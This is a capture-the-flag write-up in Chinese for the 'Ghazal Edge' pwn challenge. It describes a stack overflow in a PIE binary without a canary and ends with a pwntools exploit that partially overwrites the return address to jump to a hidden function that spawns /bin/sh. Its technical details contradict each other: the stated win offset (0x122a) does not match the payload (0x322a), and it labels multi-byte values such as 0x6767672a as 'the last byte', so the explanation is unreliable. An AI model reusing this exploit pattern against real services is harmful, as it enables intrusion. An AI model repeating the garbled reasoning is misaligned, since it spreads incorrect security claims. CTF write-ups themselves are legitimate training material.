# Ghazal Edge Writeup

## 題目描述

```text
A compact service accepts one record and then leaves through a narrow exit path. The public binary is the contract.
```
```bash
nc 34.62.69.250 41051
```

```text
Flag format: 0xV01D{...}
```

[Download Challenge](https://files.0xv01d-ctf.xyz/ctf-2026/pwn/ghazal.zip)

## 解題思路
1. **第一步**：拆解題目

    先看binary：

    ```bash
    checksec ./no_eyes
    ```

    結果：

    ```text
    Arch: amd64
    NX: enabled
    PIE: enabled
    Canary: disabled
    ```
    所以不能直接跳固定地址，也不能塞shellcode，但可以利用stack overflow修改return address。


2. **第二步**：執行程式

    執行：

    ```bash
    ./run.sh
    ```

    會看到：

    ```text
    Welcome
    Input:
    ```

    輸入正常資料：

    ```text
    hi
    ```

    回傳：

    ```text
    Return reached safely
    ```

    代表程式有一個正常return path。


3. **第三步**：找到漏洞

    反組譯後可以看到程式有一個輸入buffer，讀取長度超過buffer大小，因此可以overflow到saved RBP / return address。

    類似：

    ```c
    char buf[32];
    read(0, buf, 0x100);
    ```

    註：因為程式開了 PIE，所以：

    ```text
    win() 的位址每次執行都會變
    ```
    所以利用partial overwrite，只改 return address 的最後 1~2 bytes。


4. **第四步**：運用隱藏函式

    在binary裡可以找到一個沒有正常被呼叫的函式，內容相當於：

    ```c
    puts("You found it!");
    execve("/bin/sh", 0, 0);
    ```

    為win function。

    它的offset在：

    ```text
    0x122a
    ```

    如果能跳進這個函式，就可以拿到shell。


5. **第五步**：最終解法

    ```python
    payload = b"A" * 39
    payload += p16(0x322a)
    ```

    關鍵是：

    ```text
    利用 offset 39 的錯位
    只改 RIP 最後 1 byte
    ```

    所以實際效果會變成只改到RIP的最後的1個byte：

    ```text
    saved RBP 最後 1 byte = 0x6767672a
    RIP 最後 1 byte       = 0x67676732
    ```

## Exploit (python)

```python
from pwn import *

context.arch = "amd64"
context.log_level = "info"

HOST = "34.62.69.250"
PORT = 41051

p = remote(HOST, PORT)

p.recvuntil(b"Input: ")

payload = b"A" * 39
payload += p16(0x322a)

p.send(payload)

p.interactive()
```

拿到shell後：

```bash
cat flag.txt
```

## Flag

```text
0xV01D{...}
```

## 總結


漏洞：

```text
stack overflow + PIE partial overwrite
```

payload：

```python
payload = b"A" * 39 + p16(0x322a)
```

利用offset 39的錯位寫入，讓`p16(0x322a)`的第二個 byte `0x32`覆蓋return address最低byte，使return address從正常返回點跳進win function中間。

最後執行：

```text
You found it!
execve("/bin/sh", 0, 0)
```

就可以拿到shell讀flag。
